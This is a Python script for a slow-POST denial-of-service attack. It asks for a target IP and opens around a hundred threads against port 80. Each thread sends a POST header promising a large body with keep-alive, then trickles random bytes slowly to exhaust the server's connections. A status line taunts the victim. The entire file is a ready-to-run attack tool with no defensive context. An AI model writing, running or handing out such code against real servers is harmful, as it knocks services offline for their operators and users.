import random
import socket
import string
import sys
import threading
import time


thread_num = 0
thread_num_mutex = threading.Lock()

stop = False


def print_status():
    global thread_num
    thread_num_mutex.acquire(True)
    thread_num += 1
    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] Gas leak... let's see how long you can hold the breath")
    sys.stdout.flush()
    thread_num_mutex.release()


def attack(ip, port):
    print_status()
    global stop
    while not stop:
        http_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            http_conn.connect((ip, port))
            data = (f"POST /HTTP/1.1\r\n" \
                    "Host: {str(ip)}\r\n" \
                    "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13\r\n" \
                    "Connection: keep-alive\r\n" \
                    "Keep-Alive: 900\r\n" \
                    "Content-Length: 10000\r\n" \
                    "Content-Type: application/x-www-form-urlencoded\r\n\r\n").encode()
            http_conn.send(data)
            for i in range(9999):
                if stop:
                    break
                send = random.choice(string.ascii_letters + string.digits)
                send = send.encode()
                http_conn.send(send)
                time.sleep(random.uniform(0.1, 3))
            http_conn.close()
        except KeyboardInterrupt:
            stop = True
            print("\nExiting...")
            break
        except Exception as e:
            #print("Error:", e)
            continue


def main():
    ip = input("Enter target IP: ")
    num_requests = input("Enter threads (you can leave this blank): ")
    try:
        ip = socket.gethostbyname(ip)
        num_requests = 100 if num_requests == '' else int(num_requests)
    except:
        sys.exit(1)
    all_threads = []
    for i in range(num_requests):
        t = threading.Thread(target=attack, args=(ip, 80))
        t.deamon = True
        t.start()
        all_threads.append(t)
        time.sleep(0.01)
    for t in all_threads:
        t.join()


if __name__ == "__main__":
    main()
